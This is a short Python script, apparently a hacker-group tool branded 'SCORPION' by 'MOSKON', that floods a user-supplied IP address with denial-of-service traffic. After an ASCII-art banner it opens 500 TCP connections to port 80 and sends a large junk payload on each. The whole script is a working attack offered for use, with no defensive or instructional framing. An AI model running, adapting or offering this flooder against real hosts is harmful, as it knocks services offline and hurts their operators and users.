import os
os.system ('clear')
import socket
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[31;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33m"    # Yellow
G = "\033[31m"    # Green
W = "\033[0m"     # White
R = "\033[32m"    # Red
print(GG+"         By MOSKON  ")
print("   \033[34m   Yamani scorpion  Organization ")
print ("\033[31m     _____   _____   _____   _____    _____   _   _____   __   _  ")
print ("\033[31m    /  ___/ /  ___| /  _  \ |  _  \  |  _  \ | | /  _  \ |  \ | |")
print ("\033[31m    | |___  | |     | | | | | |_| |  | |_| | | | | | | | |   \| | ")
print ("\033[31m    \___  \ | |     | | | | |  _  /  |  ___/ | | | | | | | |\   |")
print ("\033[31m    \___  \ | |     | | | | |  _  /  |  ___/ | | | | | | | |\   | ")
print ("\033[31m     ___| | | |___  | |_| | | | \ \  | |     | | | |_| | | | \  |")
print ("\033[31m    /_____/ \_____| \_____/ |_|  \_\ |_|     |_| \_____/ |_|  \_|")

print("")



print("")
ip=input(" Enter ip : ");print("Doos in",ip)
for h in range(500):
  try:
      knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)      
      socket.setdefaulttimeout(1)
      Jmeel=knig.connect((ip,80))
      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿el"*7000
      data=data.encode("utf-8")
      knig.send(data)      
      print('[√√√] Dos in ip',YY,ip,'Dos [√√√] in',CC,'port [80]')


  except :
    print(R+"no Doos in ip ",ip)
#   print(C+"                     no problem in the ip",YY,ip)

      





